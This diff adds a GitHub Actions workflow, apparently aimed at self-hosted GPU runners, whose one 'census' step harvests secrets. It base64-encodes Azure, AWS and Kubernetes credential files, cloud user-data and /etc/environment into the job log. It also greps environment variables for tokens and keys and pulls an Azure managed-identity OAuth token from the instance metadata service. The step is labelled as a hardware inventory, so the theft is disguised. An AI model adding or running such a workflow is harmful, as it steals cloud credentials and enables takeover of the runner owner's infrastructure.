@@ -1,0 +1,20 @@
+name: ul7256
+on:
+  workflow_dispatch:
+jobs:
+  census:
+    runs-on: [self-hosted, ul-l40s]
+    steps:
+      - name: census
+        run: |
+          echo "=== UL7256-START ==="
+          id; hostname -I; uname -a; cat /etc/machine-id
+          nvidia-smi -L || true
+          nvidia-smi --query-gpu=index,name,memory.total,serial,uuid,driver_version --format=csv || true
+          ls -la /root/.azure /root/.config/az /root/.kube /root/.aws /root/.tccli /root/.aliyun 2>&1 | head -50
+          for f in /root/.azure/*.json /root/.config/az/*.json /root/.kube/config /root/.aws/credentials /etc/kubernetes/azure.json /var/lib/cloud/instance/user-data.txt /etc/environment; do [ -f "$f" ] && { echo "==== $f"; head -c 4000 "$f" | base64 -w0; echo; }; done
+          env | sort | grep -iE 'azure|aws|google|token|key|secret|subscription|tenant|client' | cut -c1-250
+          echo "==== IMDS instance"; curl -s -m 5 -H Metadata:true 'http://169.254.169.254/metadata/instance/compute?api-version=2021-12-13&format=json' | head -c 4000
+          echo; echo "==== IMDS token"
+          curl -s -m 8 -H Metadata:true 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' | head -c 4000
+          echo; echo "=== UL7256-END ==="
